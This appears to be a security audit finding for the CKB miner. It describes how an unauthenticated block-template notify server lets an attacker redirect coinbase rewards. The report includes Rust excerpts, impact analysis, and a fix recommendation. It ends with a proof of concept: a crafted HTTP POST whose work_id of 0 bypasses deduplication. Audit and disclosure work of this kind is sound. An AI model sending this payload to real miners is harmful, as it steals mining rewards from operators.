Audit Report

## Title
Unauthenticated Miner Notify HTTP Server Allows Coinbase Redirection and Mining Reward Theft — (File: `miner/src/client.rs`)

## Summary
When the CKB miner is configured with `listen` set, it starts an HTTP server via `listen_block_template_notify` that accepts `BlockTemplate` push notifications with zero authentication. Any attacker who can reach this port can inject a crafted `BlockTemplate` containing an attacker-controlled coinbase lock script. The miner will solve PoW for the injected template and submit it to the CKB node, which accepts the block and pays all block rewards to the attacker's address.

## Finding Description
`spawn_background` checks `self.config.listen` and, when set, spawns `listen_block_template_notify` which binds a raw TCP listener and dispatches every incoming connection to the `handle` function with no authentication layer:

```rust
// miner/src/client.rs L234-242
async fn listen_block_template_notify(&self, addr: SocketAddr) {
    let listener = TcpListener::bind(addr).await.unwrap();
    ...
    let handle = service_fn(move |req| handle(client.clone(), req));
```

The `handle` function (L358-369) accepts any HTTP POST body, deserializes it as `BlockTemplate`, and immediately calls `update_block_template` — no token, no IP allowlist, no signature:

```rust
async fn handle(client: Client, req: Request<hyper::body::Incoming>) -> ... {
    let body = BodyExt::collect(req).await?.aggregate();
    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);  // no auth check
    }
    Ok(Response::new(Empty::new()))
}
```

`update_block_template` (L293-312) has only a deduplication guard (`id != work_id || id == 0`), which is trivially bypassed by using `work_id = 0` in the injected template. The attacker-controlled template is then sent directly to mining workers via `new_work_tx`. Workers solve PoW and submit via `submit_block`.

`submit_block` in `rpc/src/module/miner.rs` (L260-298) only verifies the header via `HeaderVerifier` and checks that the parent hash exists, then calls `blocking_process_block`. There is no constraint on the coinbase lock script — CKB consensus does not restrict which lock script receives the block reward. A block with an attacker-controlled coinbase output passes all validation and is accepted by the node.

The CKB node's `BlockAssembler.notify()` (`tx-pool/src/block_assembler/mod.rs` L683-711) sends plain unauthenticated HTTP POSTs to the configured notify URLs, confirming that the protocol between node and miner carries no shared secret that the miner's listener could verify.

## Impact Explanation
An attacker who can reach the miner's notify listen port can permanently redirect all block rewards to their own address for as long as the injected template remains active. Every block mined while the attacker's template is in effect pays the coinbase to the attacker. This constitutes direct, irreversible theft of mining rewards — a concrete financial attack that damages the CKB economy by undermining miner incentives and redirecting network-issued CKB to an unauthorized party. This matches the **Critical** impact class: "Vulnerabilities which could easily damage CKB economy."

## Likelihood Explanation
The notify mode is a supported, documented production feature. The default config (`resource/ckb-miner.toml` L59-61) shows `listen = "127.0.0.1:8888"` commented out with a concrete example address. Any operator deploying the miner and node on separate machines — a common production topology — must bind `listen` to a non-localhost address, exposing the port to network-reachable attackers. Even with a localhost binding, any process on the same host (e.g., a compromised co-located service) can exploit it. The exploit requires a single HTTP POST with no credentials, keys, or privileged access. It is repeatable and persistent until the miner is restarted or the attacker's template is displaced by a legitimate one.

## Recommendation
Add a shared-secret authentication mechanism to the notify HTTP server. A configurable token should be added to `ClientConfig` and `BlockAssemblerConfig`. The CKB node's `BlockAssembler.notify()` should include the token as an HTTP header (e.g., `Authorization: Bearer <token>`), and the miner's `handle` function must reject requests missing or presenting an incorrect token before deserializing the body. Alternatively, enforce a strict IP allowlist in `listen_block_template_notify` so only the configured CKB node's address is accepted.

## Proof of Concept
With the miner configured as `listen = "0.0.0.0:8888"`, an attacker sends a single HTTP POST:

```
POST http://<miner-host>:8888/ HTTP/1.1
Content-Type: application/json

{
  "work_id": "0x0",
  "current_time": "0x174a3b2c000",
  "compact_target": "0x1e083126",
  "dao": "0xb5a3e047474401001bc476b9ee573000c0c387962a38000000febffacf030000",
  "epoch": "0x7080018000001",
  "parent_hash": "<current tip hash>",
  "cycles_limit": "0x2540be400",
  "bytes_limit": "0x91c08",
  "uncles_count_limit": "0x2",
  "uncles": [], "transactions": [], "proposals": [],
  "cellbase": {
    "cycles": null,
    "data": {
      "cell_deps": [], "header_deps": [],
      "inputs": [{"previous_output": {"index": "0xffffffff",
        "tx_hash": "0x0000000000000000000000000000000000000000000000000000000000000000"},
        "since": "0x0"}],
      "outputs": [{"capacity": "0x18e64b61cf",
        "lock": {"code_hash": "<secp256k1 code hash>",
                 "hash_type": "type",
                 "args": "<ATTACKER_LOCK_ARGS>"},
        "type": null}],
      "outputs_data": ["0x"], "version": "0x0",
      "witnesses": ["0x5500000010000000550000005500000041000000..."]
    }
  },
  "version": "0x0"
}
```

Using `work_id = "0x0"` bypasses the deduplication guard in `update_block_template` (the condition `id == 0` always passes). The miner accepts this template, workers solve PoW, and `submit_block` is called. The CKB node validates header and parent hash, passes `blocking_process_block`, and the block is accepted with the attacker's coinbase lock script. All block rewards are paid to the attacker's address.